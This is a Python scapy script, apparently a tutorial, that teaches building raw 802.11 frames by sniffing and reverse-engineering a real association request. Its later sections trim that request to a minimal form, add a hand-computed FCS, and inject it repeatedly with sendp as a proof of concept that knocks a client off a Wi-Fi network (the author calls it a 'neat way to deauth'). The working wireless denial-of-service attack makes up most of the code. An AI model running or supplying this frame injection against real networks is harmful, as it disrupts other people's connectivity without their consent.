#!/usr/bin/env python

import binascii, sys
from scapy.all import *
from zlib import crc32

"""
This demo will do two things:
    - Teach the user to build a frame from scratch by reverse engineering a usable frame
    
    - Show a neat way to deauth
        - Possible 802.11w ramifications here... (UNPROVEN)
"""

## Section 1
##############################################################################

## Notate the environment
myMac = 'aa:bb:cc:dd:ee:ff'
rtrMac = 'c4:3d:c7:47:b4:4a'
essid = 'wifi4'
iFace = 'wlan1mon'


def aGrab():
    """Filter Management Frames for our MAC"""
    def snarf(packet):
        global myMac
        
        if packet[Dot11].type == 0L:

            if packet[Dot11].addr1 == myMac or\
               packet[Dot11].addr2 == myMac or\
               packet[Dot11].addr3 == myMac:
                return packet
        else:
            return
    return snarf


def endSwap(value):
    """Takes an object and reverse Endians the bytes

    Useful for crc32 within 802.11:
    Autodetection logic built in for the following situations:
    Will take the stryng '0xaabbccdd' and return string '0xddccbbaa'
    Will take the integer 12345 and return integer 14640
    Will take the bytestream string of 'aabbccdd' and return string 'ddccbbaa'
    """
    try:
        value = hex(value).replace('0x', '')
        sType = 'int'
    except:
        if '0x' in value:
            sType = 'hStr'
        else:
            sType = 'bStr'
        value = value.replace('0x', '')
        
    start = 0
    end = 2
    swapList = []
    for i in range(len(value)/2):
        swapList.append(value[start:end])
        start += 2
        end += 2
    swapList.reverse()
    s = ''
    for i in swapList:
        s += i
    
    if sType == 'int':
        s = int(s, 16)
    elif sType == 'hStr':
        s = '0x' + s
    return s


## FCS generation
def fcsGen(packet):
    """Generate the FCS for an authentication or association packet"""
    fcs=hex(crc32(str(packet[Dot11])) & 0xffffffff).replace('0x', '')
    while (len(fcs)!=8):
        fcs='0'+fcs
    fcs = binascii.unhexlify(endSwap(fcs))
    _id = int(hexstr(str(fcs[0]), onlyhex = 1), 16)
    _len = int(hexstr(str(fcs[1]), onlyhex = 1), 16)
    return packet/Dot11Elt(ID = _id, len = _len, info = fcs[-2:])

raw_input('\n\ncrtl+c to continue')
##############################################################################



## Section 2
##############################################################################

## Call the closure
pHandler = aGrab()

## Capture the frames, and print so we know when to crtl + c
## We do this because we don't care about count as we're learning
## Possible, this will have to be reran in case auth[0] or assc[0] isn't captured
aPkts = sniff(iface = iFace, prn = lambda x: x.summary(), lfilter = pHandler)
##############################################################################



## Section 3
##############################################################################

## Got the frames, now search
wireshark(aPkts)
##############################################################################



## Section 4
##############################################################################

## Write the frames to a PCAP
wrpcap('auth-assc.pcap', aPkts[39:43])

## Read the PCAP and wireshark it
aPkts = rdpcap('auth-assc.pcap')
wireshark(aPkts)
##############################################################################



## Section 5
##############################################################################

"""
Whole lotta stuff going on here
Dot11Elt seems to be the most troublesome

This section gets us to thinking about what can we chop off
More chop == less work for us
"""
## Auth frame
authReq = aPkts[0]
bareAuthReq = RadioTap()/Dot11()/Dot11Auth()/Dot11Elt()

## Assc frame
asscReq = aPkts[2]
bareAsscReq = RadioTap()/Dot11()/Dot11AssoReq()/Dot11Elt()/Dot11Elt()/Dot11Elt()/Dot11Elt()/Dot11Elt()/Dot11Elt()/Dot11Elt()
##############################################################################



## Section 6
##############################################################################

"""
Wanting to be difficult, let's build an Association Frame

How we test our frame is by chopping and sending until we impact the target

Start a ping test, window on top
"""
t1 = asscReq.copy()
sendp(t1, iface = iFace)

## This works, it interrupts the flow
## Next step is to delete the last "payload"
## Frustrating, but doable once you know how in scapy
## I have yet to find a decent way to do a scapel style deletion
## First step is to show the smallest possible output
t1[Dot11Elt].summary()

## Count the Dot11Elts
## Delete the last, but backup first!
## Should be 7, therefore 6 deletes on first attempt
t1.show()
del t1[Dot11Elt].payload.payload.payload.payload.payload.payload
sendp(t1, iface = iFace, count = 5)

## Test the interrupt and retry
del t1[Dot11Elt].payload.payload.payload.payload.payload
sendp(t1, iface = iFace, count = 5)

## Test the interrupt and retry
del t1[Dot11Elt].payload.payload.payload.payload
sendp(t1, iface = iFace, count = 5)

## Test the interrupt and retry
del t1[Dot11Elt].payload.payload.payload
sendp(t1, iface = iFace, count = 5)

## Test the interrupt and retry
del t1[Dot11Elt].payload.payload
sendp(t1, iface = iFace, count = 5)

## We hit paydirt, no response!
t1 = asscReq.copy()
del t1[Dot11Elt].payload.payload.payload.payload.payload.payload
del t1[Dot11Elt].payload.payload.payload.payload.payload
del t1[Dot11Elt].payload.payload.payload.payload
del t1[Dot11Elt].payload.payload.payload
sendp(t1, iface = iFace, count = 1)
##############################################################################



## Section 7
##############################################################################

"""
We have now successfully chopped a known good packet to it's bare minimum

Let's take a peek
"""
t1.summary()
t1.show()
wireshark(t1)

## Oh noes, FCS bad...
## Digress into FCS
## .raw and .info, etc...
hexstr(str(t1.lastlayer()))
##############################################################################



## Section 8
##############################################################################

## Generic vanilla RadioTap Header for use with FCS
rBytes = '00 00 26 00 2f 40 00 a0 20 08 00 a0 20 08 00 00 00 00 00 00 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00'
rTap = RadioTap(binascii.unhexlify(rBytes.replace(' ', '')))

"""
Generate association request
info uses a known bitrate that works

asscPkt = rTap/\
          Dot11(addr1 = rMac,\
                addr2 = tMac,\
                addr3 = rMac)/\
          Dot11AssoReq()/\
          Dot11Elt(ID = 0,\
                   len = len(essid),\
                   info = essid)/\
          Dot11Elt(ID = 1,\
                   len = 8,\
                   info = '\x02\x04\x0b\x16\x0c\x12\x18$')
"""

asscPkt = rTap/Dot11(addr1 = rtrMac, addr2 = myMac, addr3 = rtrMac)/Dot11AssoReq()/Dot11Elt(ID = 0, len = len(essid), info = essid)/Dot11Elt(ID = 1, len = 8, info = '\x02\x04\x0b\x16\x0c\x12\x18$')

## We're semi cheating here, I've done the work for FCS for you with fcsGen()
## Refer to 1-1.py and discuss fcsGen

## Invoke the FCS
asscPkt = fcsGen(asscPkt)

## Demonstrate our POC
sendp(asscPkt, iface = iFace, count = 1)
